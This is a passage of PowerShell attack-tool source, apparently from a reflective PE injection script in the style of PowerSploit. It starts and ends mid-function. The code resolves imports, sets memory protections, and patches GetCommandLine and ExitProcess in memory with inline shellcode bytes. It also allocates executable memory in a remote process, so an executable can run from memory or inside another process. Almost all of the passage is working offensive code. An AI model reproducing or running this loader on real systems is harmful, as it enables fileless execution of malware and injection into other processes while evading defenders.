                    throw "Error importing DLL, DLLName: $ImportDllPath"
                }

                #Get the first thunk, then loop through all of them
                [IntPtr]$ThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.FirstThunk)
                [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($ImportDescriptor.Characteristics) #Characteristics is overloaded with OriginalFirstThunk
                [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                while ($OriginalThunkRefVal -ne [IntPtr]::Zero)
                {
                    $LoadByOrdinal = $false
                    [IntPtr]$ProcedureNamePtr = [IntPtr]::Zero
                    #Compare thunkRefVal to IMAGE_ORDINAL_FLAG, which is defined as 0x80000000 or 0x8000000000000000 depending on 32bit or 64bit
                    #   If the top bit is set on an int, it will be negative, so instead of worrying about casting this to uint
                    #   and doing the comparison, just see if it is less than 0
                    [IntPtr]$NewThunkRef = [IntPtr]::Zero
                    if([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4 -and [Int32]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [IntPtr]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    elseif([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 8 -and [Int64]$OriginalThunkRefVal -lt 0)
                    {
                        [IntPtr]$ProcedureNamePtr = [Int64]$OriginalThunkRefVal -band 0xffff #This is actually a lookup by ordinal
                        $LoadByOrdinal = $true
                    }
                    else
                    {
                        [IntPtr]$StringAddr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($OriginalThunkRefVal)
                        $StringAddr = Add-SignedIntAsUnsigned $StringAddr ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16]))
                        $ProcedureName = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($StringAddr)
                        $ProcedureNamePtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ProcedureName)
                    }

                    if ($RemoteLoading -eq $true)
                    {
                        [IntPtr]$NewThunkRef = Get-RemoteProcAddress -RemoteProcHandle $RemoteProcHandle -RemoteDllHandle $ImportDllHandle -FunctionNamePtr $ProcedureNamePtr -LoadByOrdinal $LoadByOrdinal
                    }
                    else
                    {
                        [IntPtr]$NewThunkRef = $Win32Functions.GetProcAddressIntPtr.Invoke($ImportDllHandle, $ProcedureNamePtr)
                    }

                    if ($NewThunkRef -eq $null -or $NewThunkRef -eq [IntPtr]::Zero)
                    {
                        if ($LoadByOrdinal)
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function Ordinal: $ProcedureNamePtr. Dll: $ImportDllPath"
                        }
                        else
                        {
                            Throw "New function reference is null, this is almost certainly a bug in this script. Function: $ProcedureName. Dll: $ImportDllPath"
                        }
                    }

                    [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewThunkRef, $ThunkRef, $false)

                    $ThunkRef = Add-SignedIntAsUnsigned ([Int64]$ThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRef = Add-SignedIntAsUnsigned ([Int64]$OriginalThunkRef) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]))
                    [IntPtr]$OriginalThunkRefVal = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OriginalThunkRef, [Type][IntPtr])

                    #Cleanup
                    #If loading by ordinal, ProcedureNamePtr is the ordinal value and not actually a pointer to a buffer that needs to be freed
                    if ((-not $LoadByOrdinal) -and ($ProcedureNamePtr -ne [IntPtr]::Zero))
                    {
                        [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ProcedureNamePtr)
                        $ProcedureNamePtr = [IntPtr]::Zero
                    }
                }

                $ImportDescriptorPtr = Add-SignedIntAsUnsigned ($ImportDescriptorPtr) ([System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_IMPORT_DESCRIPTOR))
            }
        }
    }

    Function Get-VirtualProtectValue
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [UInt32]
        $SectionCharacteristics
        )

        $ProtectionFlag = 0x0
        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_EXECUTE) -gt 0)
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_READ
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_EXECUTE
                }
            }
        }
        else
        {
            if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_READ) -gt 0)
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READWRITE
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_READONLY
                }
            }
            else
            {
                if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_WRITE) -gt 0)
                {
                    $ProtectionFlag = $Win32Constants.PAGE_WRITECOPY
                }
                else
                {
                    $ProtectionFlag = $Win32Constants.PAGE_NOACCESS
                }
            }
        }

        if (($SectionCharacteristics -band $Win32Constants.IMAGE_SCN_MEM_NOT_CACHED) -gt 0)
        {
            $ProtectionFlag = $ProtectionFlag -bor $Win32Constants.PAGE_NOCACHE
        }

        return $ProtectionFlag
    }

    Function Update-MemoryProtectionFlags
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [System.Object]
        $Win32Types
        )

        for( $i = 0; $i -lt $PEInfo.IMAGE_NT_HEADERS.FileHeader.NumberOfSections; $i++)
        {
            [IntPtr]$SectionHeaderPtr = [IntPtr](Add-SignedIntAsUnsigned ([Int64]$PEInfo.SectionHeaderPtr) ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$Win32Types.IMAGE_SECTION_HEADER)))
            $SectionHeader = [System.Runtime.InteropServices.Marshal]::PtrToStructure($SectionHeaderPtr, [Type]$Win32Types.IMAGE_SECTION_HEADER)
            [IntPtr]$SectionPtr = Add-SignedIntAsUnsigned ($PEInfo.PEHandle) ($SectionHeader.VirtualAddress)

            [UInt32]$ProtectFlag = Get-VirtualProtectValue $SectionHeader.Characteristics
            [UInt32]$SectionSize = $SectionHeader.VirtualSize

            [UInt32]$OldProtectFlag = 0
            Test-MemoryRangeValid -DebugString "Update-MemoryProtectionFlags::VirtualProtect" -PEInfo $PEInfo -StartAddress $SectionPtr -Size $SectionSize | Out-Null
            $Success = $Win32Functions.VirtualProtect.Invoke($SectionPtr, $SectionSize, $ProtectFlag, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Unable to change memory protection"
            }
        }
    }

    #This function overwrites GetCommandLine and ExitThread which are needed to reflectively load an EXE
    #Returns an object with addresses to copies of the bytes that were overwritten (and the count)
    Function Update-ExeFunctions
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [System.Object]
        $PEInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants,

        [Parameter(Position = 3, Mandatory = $true)]
        [String]
        $ExeArguments,

        [Parameter(Position = 4, Mandatory = $true)]
        [IntPtr]
        $ExeDoneBytePtr
        )

        #This will be an array of arrays. The inner array will consist of: @($DestAddr, $SourceAddr, $ByteCount). This is used to return memory to its original state.
        $ReturnArray = @()

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])
        [UInt32]$OldProtectFlag = 0

        [IntPtr]$Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("Kernel32.dll")
        if ($Kernel32Handle -eq [IntPtr]::Zero)
        {
            throw "Kernel32 handle null"
        }

        [IntPtr]$KernelBaseHandle = $Win32Functions.GetModuleHandle.Invoke("KernelBase.dll")
        if ($KernelBaseHandle -eq [IntPtr]::Zero)
        {
            throw "KernelBase handle null"
        }

        #################################################
        #First overwrite the GetCommandLine() function. This is the function that is called by a new process to get the command line args used to start it.
        #   We overwrite it with shellcode to return a pointer to the string ExeArguments, allowing us to pass the exe any args we want.
        $CmdLineWArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)
        $CmdLineAArgsPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)

        [IntPtr]$GetCommandLineAAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineA")
        [IntPtr]$GetCommandLineWAddr = $Win32Functions.GetProcAddress.Invoke($KernelBaseHandle, "GetCommandLineW")

        if ($GetCommandLineAAddr -eq [IntPtr]::Zero -or $GetCommandLineWAddr -eq [IntPtr]::Zero)
        {
            throw "GetCommandLine ptr null. GetCommandLineA: $(Get-Hex $GetCommandLineAAddr). GetCommandLineW: $(Get-Hex $GetCommandLineWAddr)"
        }

        #Prepare the shellcode
        [Byte[]]$Shellcode1 = @()
        if ($PtrSize -eq 8)
        {
            $Shellcode1 += 0x48 #64bit shellcode has the 0x48 before the 0xb8
        }
        $Shellcode1 += 0xb8

        [Byte[]]$Shellcode2 = @(0xc3)
        $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length

        #Make copy of GetCommandLineA and GetCommandLineW
        $GetCommandLineAOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $GetCommandLineWOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
        $Win32Functions.memcpy.Invoke($GetCommandLineAOrigBytesPtr, $GetCommandLineAAddr, [UInt64]$TotalSize) | Out-Null
        $Win32Functions.memcpy.Invoke($GetCommandLineWOrigBytesPtr, $GetCommandLineWAddr, [UInt64]$TotalSize) | Out-Null
        $ReturnArray += ,($GetCommandLineAAddr, $GetCommandLineAOrigBytesPtr, $TotalSize)
        $ReturnArray += ,($GetCommandLineWAddr, $GetCommandLineWOrigBytesPtr, $TotalSize)

        #Overwrite GetCommandLineA
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineAAddrTemp = $GetCommandLineAAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineAAddrTemp
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineAArgsPtr, $GetCommandLineAAddrTemp, $false)
        $GetCommandLineAAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineAAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineAAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineAAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null


        #Overwrite GetCommandLineW
        [UInt32]$OldProtectFlag = 0
        $Success = $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
        if ($Success = $false)
        {
            throw "Call to VirtualProtect failed"
        }

        $GetCommandLineWAddrTemp = $GetCommandLineWAddr
        Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $GetCommandLineWAddrTemp
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp ($Shellcode1.Length)
        [System.Runtime.InteropServices.Marshal]::StructureToPtr($CmdLineWArgsPtr, $GetCommandLineWAddrTemp, $false)
        $GetCommandLineWAddrTemp = Add-SignedIntAsUnsigned $GetCommandLineWAddrTemp $PtrSize
        Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $GetCommandLineWAddrTemp

        $Win32Functions.VirtualProtect.Invoke($GetCommandLineWAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        #################################################

        #################################################
        #For C++ stuff that is compiled with visual studio as "multithreaded DLL", the above method of overwriting GetCommandLine doesn't work.
        #   I don't know why exactly.. But the msvcr DLL that a "DLL compiled executable" imports has an export called _acmdln and _wcmdln.
        #   It appears to call GetCommandLine and store the result in this var. Then when you call __wgetcmdln it parses and returns the
        #   argv and argc values stored in these variables. So the easy thing to do is just overwrite the variable since they are exported.
        $DllList = @("msvcr70d.dll", "msvcr71d.dll", "msvcr80d.dll", "msvcr90d.dll", "msvcr100d.dll", "msvcr110d.dll", "msvcr70.dll" `
            , "msvcr71.dll", "msvcr80.dll", "msvcr90.dll", "msvcr100.dll", "msvcr110.dll")

        foreach ($Dll in $DllList)
        {
            [IntPtr]$DllHandle = $Win32Functions.GetModuleHandle.Invoke($Dll)
            if ($DllHandle -ne [IntPtr]::Zero)
            {
                [IntPtr]$WCmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_wcmdln")
                [IntPtr]$ACmdLnAddr = $Win32Functions.GetProcAddress.Invoke($DllHandle, "_acmdln")
                if ($WCmdLnAddr -eq [IntPtr]::Zero -or $ACmdLnAddr -eq [IntPtr]::Zero)
                {
                    "Error, couldn't find _wcmdln or _acmdln"
                }

                $NewACmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalAnsi($ExeArguments)
                $NewWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::StringToHGlobalUni($ExeArguments)

                #Make a copy of the original char* and wchar_t* so these variables can be returned back to their original state
                $OrigACmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ACmdLnAddr, [Type][IntPtr])
                $OrigWCmdLnPtr = [System.Runtime.InteropServices.Marshal]::PtrToStructure($WCmdLnAddr, [Type][IntPtr])
                $OrigACmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                $OrigWCmdLnPtrStorage = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($PtrSize)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigACmdLnPtr, $OrigACmdLnPtrStorage, $false)
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($OrigWCmdLnPtr, $OrigWCmdLnPtrStorage, $false)
                $ReturnArray += ,($ACmdLnAddr, $OrigACmdLnPtrStorage, $PtrSize)
                $ReturnArray += ,($WCmdLnAddr, $OrigWCmdLnPtrStorage, $PtrSize)

                $Success = $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewACmdLnPtr, $ACmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($ACmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null

                $Success = $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($Win32Constants.PAGE_EXECUTE_READWRITE), [Ref]$OldProtectFlag)
                if ($Success = $false)
                {
                    throw "Call to VirtualProtect failed"
                }
                [System.Runtime.InteropServices.Marshal]::StructureToPtr($NewWCmdLnPtr, $WCmdLnAddr, $false)
                $Win32Functions.VirtualProtect.Invoke($WCmdLnAddr, [UInt32]$PtrSize, [UInt32]($OldProtectFlag), [Ref]$OldProtectFlag) | Out-Null
            }
        }
        #################################################

        #################################################
        #Next overwrite CorExitProcess and ExitProcess to instead ExitThread. This way the entire Powershell process doesn't die when the EXE exits.

        $ReturnArray = @()
        $ExitFunctions = @() #Array of functions to overwrite so the thread doesn't exit the process

        #CorExitProcess (compiled in to visual studio c++)
        [IntPtr]$MscoreeHandle = $Win32Functions.GetModuleHandle.Invoke("mscoree.dll")
        if ($MscoreeHandle -eq [IntPtr]::Zero)
        {
            throw "mscoree handle null"
        }
        [IntPtr]$CorExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($MscoreeHandle, "CorExitProcess")
        if ($CorExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "CorExitProcess address not found"
        }
        $ExitFunctions += $CorExitProcessAddr

        #ExitProcess (what non-managed programs use)
        [IntPtr]$ExitProcessAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitProcess")
        if ($ExitProcessAddr -eq [IntPtr]::Zero)
        {
            Throw "ExitProcess address not found"
        }
        $ExitFunctions += $ExitProcessAddr

        [UInt32]$OldProtectFlag = 0
        foreach ($ProcExitFunctionAddr in $ExitFunctions)
        {
            $ProcExitFunctionAddrTmp = $ProcExitFunctionAddr
            #The following is the shellcode (Shellcode: ExitThread.asm):
            #32bit shellcode
            [Byte[]]$Shellcode1 = @(0xbb)
            [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x83, 0xec, 0x20, 0x83, 0xe4, 0xc0, 0xbb)
            #64bit shellcode (Shellcode: ExitThread.asm)
            if ($PtrSize -eq 8)
            {
                [Byte[]]$Shellcode1 = @(0x48, 0xbb)
                [Byte[]]$Shellcode2 = @(0xc6, 0x03, 0x01, 0x48, 0x83, 0xec, 0x20, 0x66, 0x83, 0xe4, 0xc0, 0x48, 0xbb)
            }
            [Byte[]]$Shellcode3 = @(0xff, 0xd3)
            $TotalSize = $Shellcode1.Length + $PtrSize + $Shellcode2.Length + $PtrSize + $Shellcode3.Length

            [IntPtr]$ExitThreadAddr = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "ExitThread")
            if ($ExitThreadAddr -eq [IntPtr]::Zero)
            {
                Throw "ExitThread address not found"
            }

            $Success = $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            #Make copy of original ExitProcess bytes
            $ExitProcessOrigBytesPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TotalSize)
            $Win32Functions.memcpy.Invoke($ExitProcessOrigBytesPtr, $ProcExitFunctionAddr, [UInt64]$TotalSize) | Out-Null
            $ReturnArray += ,($ProcExitFunctionAddr, $ExitProcessOrigBytesPtr, $TotalSize)

            #Write the ExitThread shellcode to memory. This shellcode will write 0x01 to ExeDoneBytePtr address (so PS knows the EXE is done), then
            #   call ExitThread
            Write-BytesToMemory -Bytes $Shellcode1 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode1.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExeDoneBytePtr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode2 -MemoryAddress $ProcExitFunctionAddrTmp
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp ($Shellcode2.Length)
            [System.Runtime.InteropServices.Marshal]::StructureToPtr($ExitThreadAddr, $ProcExitFunctionAddrTmp, $false)
            $ProcExitFunctionAddrTmp = Add-SignedIntAsUnsigned $ProcExitFunctionAddrTmp $PtrSize
            Write-BytesToMemory -Bytes $Shellcode3 -MemoryAddress $ProcExitFunctionAddrTmp

            $Win32Functions.VirtualProtect.Invoke($ProcExitFunctionAddr, [UInt32]$TotalSize, [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
        #################################################

        Write-Output $ReturnArray
    }

    #This function takes an array of arrays, the inner array of format @($DestAddr, $SourceAddr, $Count)
    #   It copies Count bytes from Source to Destination.
    Function Copy-ArrayOfMemAddresses
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [Array[]]
        $CopyInfo,

        [Parameter(Position = 1, Mandatory = $true)]
        [System.Object]
        $Win32Functions,

        [Parameter(Position = 2, Mandatory = $true)]
        [System.Object]
        $Win32Constants
        )

        [UInt32]$OldProtectFlag = 0
        foreach ($Info in $CopyInfo)
        {
            $Success = $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$Win32Constants.PAGE_EXECUTE_READWRITE, [Ref]$OldProtectFlag)
            if ($Success -eq $false)
            {
                Throw "Call to VirtualProtect failed"
            }

            $Win32Functions.memcpy.Invoke($Info[0], $Info[1], [UInt64]$Info[2]) | Out-Null

            $Win32Functions.VirtualProtect.Invoke($Info[0], [UInt32]$Info[2], [UInt32]$OldProtectFlag, [Ref]$OldProtectFlag) | Out-Null
        }
    }


    #####################################
    ##########    FUNCTIONS   ###########
    #####################################
    Function Get-MemoryProcAddress
    {
        Param(
        [Parameter(Position = 0, Mandatory = $true)]
        [IntPtr]
        $PEHandle,

        [Parameter(Position = 1, Mandatory = $true)]
        [String]
        $FunctionName
        )

        $Win32Types = Get-Win32Types
        $Win32Constants = Get-Win32Constants
        $PEInfo = Get-PEDetailedInfo -PEHandle $PEHandle -Win32Types $Win32Types -Win32Constants $Win32Constants

        #Get the export table
        if ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.Size -eq 0)
        {
            return [IntPtr]::Zero
        }
        $ExportTablePtr = Add-SignedIntAsUnsigned ($PEHandle) ($PEInfo.IMAGE_NT_HEADERS.OptionalHeader.ExportTable.VirtualAddress)
        $ExportTable = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExportTablePtr, [Type]$Win32Types.IMAGE_EXPORT_DIRECTORY)

        for ($i = 0; $i -lt $ExportTable.NumberOfNames; $i++)
        {
            #AddressOfNames is an array of pointers to strings of the names of the functions exported
            $NameOffsetPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNames + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
            $NamePtr = Add-SignedIntAsUnsigned ($PEHandle) ([System.Runtime.InteropServices.Marshal]::PtrToStructure($NameOffsetPtr, [Type][UInt32]))
            $Name = [System.Runtime.InteropServices.Marshal]::PtrToStringAnsi($NamePtr)

            if ($Name -ceq $FunctionName)
            {
                #AddressOfNameOrdinals is a table which contains points to a WORD which is the index in to AddressOfFunctions
                #    which contains the offset of the function in to the DLL
                $OrdinalPtr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfNameOrdinals + ($i * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt16])))
                $FuncIndex = [System.Runtime.InteropServices.Marshal]::PtrToStructure($OrdinalPtr, [Type][UInt16])
                $FuncOffsetAddr = Add-SignedIntAsUnsigned ($PEHandle) ($ExportTable.AddressOfFunctions + ($FuncIndex * [System.Runtime.InteropServices.Marshal]::SizeOf([Type][UInt32])))
                $FuncOffset = [System.Runtime.InteropServices.Marshal]::PtrToStructure($FuncOffsetAddr, [Type][UInt32])
                return Add-SignedIntAsUnsigned ($PEHandle) ($FuncOffset)
            }
        }

        return [IntPtr]::Zero
    }


    Function Invoke-MemoryLoadLibrary
    {
        Param(
        [Parameter( Position = 0, Mandatory = $true )]
        [Byte[]]
        $PEBytes,

        [Parameter(Position = 1, Mandatory = $false)]
        [String]
        $ExeArgs,

        [Parameter(Position = 2, Mandatory = $false)]
        [IntPtr]
        $RemoteProcHandle,

        [Parameter(Position = 3)]
        [Bool]
        $ForceASLR = $false
        )

        $PtrSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr])

        #Get Win32 constants and functions
        $Win32Constants = Get-Win32Constants
        $Win32Functions = Get-Win32Functions
        $Win32Types = Get-Win32Types

        $RemoteLoading = $false
        if (($RemoteProcHandle -ne $null) -and ($RemoteProcHandle -ne [IntPtr]::Zero))
        {
            $RemoteLoading = $true
        }

        #Get basic PE information
        Write-Verbose "Getting basic PE information from the file"
        $PEInfo = Get-PEBasicInfo -PEBytes $PEBytes -Win32Types $Win32Types
        $OriginalImageBase = $PEInfo.OriginalImageBase
        $NXCompatible = $true
        if (([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT) -ne $Win32Constants.IMAGE_DLLCHARACTERISTICS_NX_COMPAT)
        {
            Write-Warning "PE is not compatible with DEP, might cause issues" -WarningAction Continue
            $NXCompatible = $false
        }

        #Verify that the PE and the current process are the same bits (32bit or 64bit)
        $Process64Bit = $true
        if ($RemoteLoading -eq $true)
        {
            $Kernel32Handle = $Win32Functions.GetModuleHandle.Invoke("kernel32.dll")
            $Result = $Win32Functions.GetProcAddress.Invoke($Kernel32Handle, "IsWow64Process")
            if ($Result -eq [IntPtr]::Zero)
            {
                Throw "Couldn't locate IsWow64Process function to determine if target process is 32bit or 64bit"
            }

            [Bool]$Wow64Process = $false
            $Success = $Win32Functions.IsWow64Process.Invoke($RemoteProcHandle, [Ref]$Wow64Process)
            if ($Success -eq $false)
            {
                Throw "Call to IsWow64Process failed"
            }

            if (($Wow64Process -eq $true) -or (($Wow64Process -eq $false) -and ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -eq 4)))
            {
                $Process64Bit = $false
            }

            #PowerShell needs to be same bit as the PE being loaded for IntPtr to work correctly
            $PowerShell64Bit = $true
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $PowerShell64Bit = $false
            }
            if ($PowerShell64Bit -ne $Process64Bit)
            {
                throw "PowerShell must be same architecture (x86/x64) as PE being loaded and remote process"
            }
        }
        else
        {
            if ([System.Runtime.InteropServices.Marshal]::SizeOf([Type][IntPtr]) -ne 8)
            {
                $Process64Bit = $false
            }
        }
        if ($Process64Bit -ne $PEInfo.PE64Bit)
        {
            Throw "PE platform doesn't match the architecture of the process it is being loaded in (32/64bit)"
        }

        #Allocate memory and write the PE to memory. If the PE supports ASLR, allocate to a random memory address
        Write-Verbose "Allocating memory for the PE and write its headers to memory"

        #ASLR check
        [IntPtr]$LoadAddr = [IntPtr]::Zero
        $PESupportsASLR = ([Int] $PEInfo.DllCharacteristics -band $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE) -eq $Win32Constants.IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE
        if ((-not $ForceASLR) -and (-not $PESupportsASLR))
        {
            Write-Warning "PE file being reflectively loaded is not ASLR compatible. If the loading fails, try restarting PowerShell and trying again OR try using the -ForceASLR flag (could cause crashes)" -WarningAction Continue
            [IntPtr]$LoadAddr = $OriginalImageBase
        }
        elseif ($ForceASLR -and (-not $PESupportsASLR))
        {
            Write-Verbose "PE file doesn't support ASLR but -ForceASLR is set. Forcing ASLR on the PE file. This could result in a crash."
        }

        if ($ForceASLR -and $RemoteLoading)
        {
            Write-Error "Cannot use ForceASLR when loading in to a remote process." -ErrorAction Stop
        }
        if ($RemoteLoading -and (-not $PESupportsASLR))
        {
            Write-Error "PE doesn't support ASLR. Cannot load a non-ASLR PE in to a remote process" -ErrorAction Stop
        }

        $PEHandle = [IntPtr]::Zero              #This is where the PE is allocated in PowerShell
        $EffectivePEHandle = [IntPtr]::Zero     #This is the address the PE will be loaded to. If it is loaded in PowerShell, this equals $PEHandle. If it is loaded in a remote process, this is the address in the remote process.
        if ($RemoteLoading -eq $true)
        {
            #Allocate space in the remote process, and also allocate space in PowerShell. The PE will be setup in PowerShell and copied to the remote process when it is setup
            $PEHandle = $Win32Functions.VirtualAlloc.Invoke([IntPtr]::Zero, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)

            #todo, error handling needs to delete this memory if an error happens along the way
            $EffectivePEHandle = $Win32Functions.VirtualAllocEx.Invoke($RemoteProcHandle, $LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_EXECUTE_READWRITE)
            if ($EffectivePEHandle -eq [IntPtr]::Zero)
            {
                Throw "Unable to allocate memory in the remote process. If the PE being loaded doesn't support ASLR, it could be that the requested base address of the PE is already in use"
            }
        }
        else
        {
            if ($NXCompatible -eq $true)
            {
                $PEHandle = $Win32Functions.VirtualAlloc.Invoke($LoadAddr, [UIntPtr]$PEInfo.SizeOfImage, $Win32Constants.MEM_COMMIT -bor $Win32Constants.MEM_RESERVE, $Win32Constants.PAGE_READWRITE)
            }
            else
            {
